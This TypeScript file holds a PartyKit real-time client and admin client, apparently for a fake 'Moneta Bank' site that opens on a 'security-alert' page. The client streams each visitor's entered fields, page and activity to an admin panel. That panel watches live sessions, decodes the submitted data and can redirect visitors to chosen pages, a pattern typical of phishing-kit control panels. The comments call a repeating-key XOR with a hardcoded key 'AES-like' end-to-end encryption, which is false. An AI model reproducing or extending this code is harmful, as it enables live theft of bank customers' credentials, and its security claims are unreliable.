// ============================================================================
// PARTYKIT CLIENT - ENCRYPTED REAL-TIME CONNECTION
// ============================================================================
// Ultra-fast WebSocket connection with end-to-end encryption
// ============================================================================

import PartySocket from "partysocket";

// Simple encryption for sensitive data (AES-like substitution)
const ENCRYPTION_KEY = "MONETA_BANK_SECURE_KEY_2025";

function encrypt(data: string): string {
  let encrypted = "";
  for (let i = 0; i < data.length; i++) {
    const charCode = data.charCodeAt(i);
    const keyChar = ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length);
    encrypted += String.fromCharCode(charCode ^ keyChar);
  }
  return btoa(encrypted); // Base64 encode
}

function decrypt(encrypted: string): string {
  try {
    const decoded = atob(encrypted);
    let decrypted = "";
    for (let i = 0; i < decoded.length; i++) {
      const charCode = decoded.charCodeAt(i);
      const keyChar = ENCRYPTION_KEY.charCodeAt(i % ENCRYPTION_KEY.length);
      decrypted += String.fromCharCode(charCode ^ keyChar);
    }
    return decrypted;
  } catch {
    return encrypted; // Return as-is if not encrypted
  }
}

interface ClientData {
  clientId: string;
  sessionId: string;
  currentPage: string;
  status: 'online' | 'offline';
  startedAt: number;
  lastSeen: number;
  ip: string;
  userAgent: string;
  location?: string;
  data: Record<string, any>;
  activityHistory: Array<{
    timestamp: number;
    page: string;
    action: string;
    details?: string;
  }>;
}

export class PartyKitClient {
  private socket: PartySocket | null = null;
  private clientId: string;
  private sessionId: string;
  private heartbeatInterval: number | null = null;
  private reconnectTimeout: number | null = null;
  private isConnected: boolean = false;
  private messageHandlers: Map<string, (data: any) => void> = new Map();

  constructor(
    private host: string = "localhost:1999",
    private room: string = "moneta-bank-main"
  ) {
    this.clientId = this.generateClientId();
    this.sessionId = this.generateSessionId();
  }

  private generateClientId(): string {
    return `client_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  }

  private generateSessionId(): string {
    return `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  }

  async connect(): Promise<void> {
    return new Promise((resolve, reject) => {
      try {
        // Create PartySocket connection
        this.socket = new PartySocket({
          host: this.host,
          room: this.room,
        });

        this.socket.addEventListener("open", () => {
          console.log("✅ PartyKit connected");
          this.isConnected = true;

          // Register client
          this.registerClient();

          // Start heartbeat
          this.startHeartbeat();

          resolve();
        });

        this.socket.addEventListener("message", (event) => {
          this.handleMessage(event.data);
        });

        this.socket.addEventListener("close", () => {
          console.log("❌ PartyKit disconnected");
          this.isConnected = false;
          this.stopHeartbeat();
          
          // Auto-reconnect after 2 seconds
          this.reconnectTimeout = window.setTimeout(() => {
            console.log("🔄 Reconnecting...");
            this.connect();
          }, 2000);
        });

        this.socket.addEventListener("error", (error) => {
          console.error("PartyKit error:", error);
          reject(error);
        });

      } catch (error) {
        console.error("Failed to connect:", error);
        reject(error);
      }
    });
  }

  private registerClient() {
    const userAgent = navigator.userAgent;
    const currentPage = window.location.hash.slice(1) || 'security-alert';

    this.send({
      type: 'client:register',
      data: {
        clientId: this.clientId,
        sessionId: this.sessionId,
        currentPage,
        ip: 'Unknown', // Will be set by server
        userAgent,
        location: Intl.DateTimeFormat().resolvedOptions().timeZone
      }
    });
  }

  private startHeartbeat() {
    // Send heartbeat every 10 seconds
    this.heartbeatInterval = window.setInterval(() => {
      if (this.isConnected) {
        this.send({ type: 'client:heartbeat' });
      }
    }, 10000);
  }

  private stopHeartbeat() {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
      this.heartbeatInterval = null;
    }
  }

  private handleMessage(data: string) {
    try {
      const message = JSON.parse(data);

      // Call registered handlers
      const handler = this.messageHandlers.get(message.type);
      if (handler) {
        handler(message.data);
      }

      // Handle specific message types
      if (message.type === 'server:redirect') {
        // Admin redirected this client
        const page = message.data.page;
        window.location.hash = page;
      }

    } catch (error) {
      console.error("Error handling message:", error);
    }
  }

  on(messageType: string, handler: (data: any) => void) {
    this.messageHandlers.set(messageType, handler);
  }

  updatePage(page: string) {
    this.send({
      type: 'client:update',
      data: {
        clientId: this.clientId,
        currentPage: page
      }
    });
  }

  sendData(field: string, value: any, sensitive: boolean = true) {
    // Encrypt sensitive data
    const dataToSend = sensitive ? {
      ...value,
      _encrypted: true,
      _data: encrypt(JSON.stringify(value))
    } : value;

    this.send({
      type: 'client:data',
      data: {
        field,
        value: dataToSend
      }
    });
  }

  logActivity(page: string, action: string, details?: string) {
    this.send({
      type: 'client:activity',
      data: { page, action, details }
    });
  }

  private send(message: any) {
    if (this.socket && this.isConnected) {
      this.socket.send(JSON.stringify(message));
    }
  }

  disconnect() {
    this.stopHeartbeat();
    if (this.reconnectTimeout) {
      clearTimeout(this.reconnectTimeout);
    }
    if (this.socket) {
      this.socket.close();
      this.socket = null;
    }
  }

  getClientId(): string {
    return this.clientId;
  }

  getSessionId(): string {
    return this.sessionId;
  }
}

// Admin client
export class PartyKitAdminClient {
  private socket: PartySocket | null = null;
  private isConnected: boolean = false;
  private messageHandlers: Map<string, (data: any) => void> = new Map();

  constructor(
    private host: string = "localhost:1999",
    private room: string = "moneta-bank-main"
  ) {}

  async connect(): Promise<void> {
    return new Promise((resolve, reject) => {
      try {
        this.socket = new PartySocket({
          host: this.host,
          room: this.room,
        });

        this.socket.addEventListener("open", () => {
          console.log("✅ Admin PartyKit connected");
          this.isConnected = true;

          // Request all clients
          this.requestClients();

          resolve();
        });

        this.socket.addEventListener("message", (event) => {
          this.handleMessage(event.data);
        });

        this.socket.addEventListener("close", () => {
          console.log("❌ Admin PartyKit disconnected");
          this.isConnected = false;
          
          // Auto-reconnect
          setTimeout(() => {
            console.log("🔄 Admin reconnecting...");
            this.connect();
          }, 2000);
        });

        this.socket.addEventListener("error", (error) => {
          console.error("Admin PartyKit error:", error);
          reject(error);
        });

      } catch (error) {
        reject(error);
      }
    });
  }

  private requestClients() {
    this.send({ type: 'admin:request_clients' });
  }

  private handleMessage(data: string) {
    try {
      const message = JSON.parse(data);

      // Decrypt sensitive data if encrypted
      if (message.data && typeof message.data === 'object') {
        this.decryptClientData(message.data);
      }

      // Call registered handlers
      const handler = this.messageHandlers.get(message.type);
      if (handler) {
        handler(message.data);
      }

    } catch (error) {
      console.error("Error handling admin message:", error);
    }
  }

  private decryptClientData(data: any) {
    // Recursively decrypt encrypted fields
    if (Array.isArray(data)) {
      data.forEach(item => this.decryptClientData(item));
    } else if (typeof data === 'object' && data !== null) {
      // Check if this object is encrypted
      if (data._encrypted && data._data) {
        try {
          const decrypted = JSON.parse(decrypt(data._data));
          Object.assign(data, decrypted);
          delete data._encrypted;
          delete data._data;
        } catch (e) {
          console.error("Decryption error:", e);
        }
      }

      // Recursively process nested objects
      Object.keys(data).forEach(key => {
        if (typeof data[key] === 'object') {
          this.decryptClientData(data[key]);
        }
      });
    }
  }

  on(messageType: string, handler: (data: any) => void) {
    this.messageHandlers.set(messageType, handler);
  }

  redirectClient(clientId: string, page: string) {
    this.send({
      type: 'admin:redirect',
      data: { clientId, page }
    });
  }

  disconnectClient(clientId: string) {
    this.send({
      type: 'admin:disconnect',
      data: { clientId }
    });
  }

  private send(message: any) {
    if (this.socket && this.isConnected) {
      this.socket.send(JSON.stringify(message));
    }
  }

  disconnect() {
    if (this.socket) {
      this.socket.close();
      this.socket = null;
    }
  }
}

// Decrypt utility for admin viewing
export function decryptData(encryptedData: string): any {
  try {
    return JSON.parse(decrypt(encryptedData));
  } catch {
    return null;
  }
}
